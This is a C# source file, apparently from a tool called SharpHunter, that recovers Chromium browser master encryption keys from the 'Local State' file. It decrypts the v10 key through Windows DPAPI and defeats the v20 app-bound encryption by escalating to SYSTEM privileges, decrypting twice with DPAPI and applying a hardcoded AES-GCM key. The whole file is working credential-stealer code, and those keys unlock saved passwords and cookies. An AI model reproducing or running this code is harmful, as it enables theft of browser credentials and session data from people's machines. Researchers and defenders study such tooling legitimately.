using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;

namespace SharpHunter.Utils
{
    public struct MasterKey
    {
        public byte[] MasterKey_v10;
        public byte[] MasterKey_v20;
    }

    internal class ChromiumDecryption
    {
        [DllImport("crypt32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        private static extern bool CryptUnprotectData(
            ref DATA_BLOB pDataIn,
            string szDataDescr,
            IntPtr pOptionalEntropy,
            IntPtr pvReserved,
            IntPtr pPromptStruct,
            int dwFlags,
            ref DATA_BLOB pDataOut);

        [StructLayout(LayoutKind.Sequential)]
        private struct DATA_BLOB
        {
            public int cbData;
            public IntPtr pbData;
        }

        public static MasterKey GetChromiumMasterKey(string dirPath)
        {
            string filePath = Path.Combine(dirPath, "Local State");
            if (!File.Exists(filePath))
                return new MasterKey();

            string content = File.ReadAllText(filePath);
            byte[] masterKeyV10 = null, masterKeyV20 = null;

            if (!string.IsNullOrEmpty(content))
            {
                // 解密v10和v20版本的密钥
                masterKeyV10 = DecryptKey(content, "\"encrypted_key\":\"(.*?)\"", 5);
                masterKeyV20 = DecryptKey(content, "\"app_bound_encrypted_key\":\"(.*?)\"", 4, true);
            }

            return new MasterKey
            {
                MasterKey_v10 = masterKeyV10,
                MasterKey_v20 = masterKeyV20,
            };
        }
        private static byte[] DecryptKey(string content, string pattern, int skipBytes, bool isV20 = false)
        {
            var match = FindEncryptedKey(content, pattern);
            if (match.Count > 0)
            {
                try
                {
                    byte[] key = Convert.FromBase64String(match[0]);
                    key = key.Skip(skipBytes).ToArray();
                    return isV20 ? DecryptV20Key(key) : DPAPIDecrypt(key);
                }
                catch (Exception ex)
                {
                    Console.WriteLine("[-] Error DecryptKey: " + ex.Message);
                }
            }
            return null;
        }

        private static byte[] DecryptV20Key(byte[] key)
        {
            byte[] decryptedKey = DoubleStepDPAPIDecrypt(key);
            if (decryptedKey != null && decryptedKey.Length > 0)
            {
                decryptedKey = decryptedKey.Skip(decryptedKey.Length - 61).ToArray();
                byte[] iv = decryptedKey.Skip(1).Take(12).ToArray();
                byte[] ciphertext = decryptedKey.Skip(13).ToArray();
                byte[] tag = decryptedKey.Skip(45).ToArray();

                byte[] aesKey = {
                    0xB3, 0x1C, 0x6E, 0x24, 0x1A, 0xC8, 0x46, 0x72, 0x8D, 0xA9, 0xC1, 0xFA, 0xC4, 0x93, 0x66, 0x51,
                    0xCF, 0xFB, 0x94, 0x4D, 0x14, 0x3A, 0xB8, 0x16, 0x27, 0x6B, 0xCC, 0x6D, 0xA0, 0x28, 0x47, 0x87
                };

                try
                {
                    AesGcm aes = new AesGcm();
                    byte[] encryptedData = new byte[ciphertext.Length - tag.Length];
                    Array.Copy(ciphertext, 0, encryptedData, 0, encryptedData.Length);
                    return aes.Decrypt(aesKey, iv, null, encryptedData, tag);
                }
                catch (Exception)
                {
                    return decryptedKey.Skip(decryptedKey.Length - 32).ToArray();
                }
            }
            return null;
        }
        private static List<string> FindEncryptedKey(string content, string pattern)
        {
            var matches = Regex.Matches(content, pattern);
            var result = new List<string>();
            foreach (Match match in matches)
            {
                if (match.Groups.Count > 1)
                    result.Add(match.Groups[1].Value);
            }
            return result;
        }
        private static byte[] DPAPIDecrypt(byte[] encryptedBytes)
        {
            DATA_BLOB inputBlob = new DATA_BLOB();
            DATA_BLOB outputBlob = new DATA_BLOB();

            inputBlob.pbData = Marshal.AllocHGlobal(encryptedBytes.Length);
            inputBlob.cbData = encryptedBytes.Length;
            Marshal.Copy(encryptedBytes, 0, inputBlob.pbData, encryptedBytes.Length);

            try
            {
                if (CryptUnprotectData(ref inputBlob, null, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, 0, ref outputBlob))
                {
                    byte[] decryptedBytes = new byte[outputBlob.cbData];
                    Marshal.Copy(outputBlob.pbData, decryptedBytes, 0, outputBlob.cbData);
                    return decryptedBytes;
                }
                else
                {
                    return null;
                }
            }
            finally
            {
                Marshal.FreeHGlobal(inputBlob.pbData);
                Marshal.FreeHGlobal(outputBlob.pbData);
            }
        }

        private static byte[] DoubleStepDPAPIDecrypt(byte[] encryptedData)
        {
            if (!Win32.GetSystemPrivileges())
            {
                return null;
            }
            byte[] intermediateData = DPAPIDecrypt(encryptedData);

            Win32.RevertToSelf();

            if (intermediateData.Length > 0)
            {
                var encryptedKey = DPAPIDecrypt(intermediateData);
                return encryptedKey;
            }
            else
            {
                Console.WriteLine("[-] First step decryption failed.");
                return null;
            }
        }
    }
}
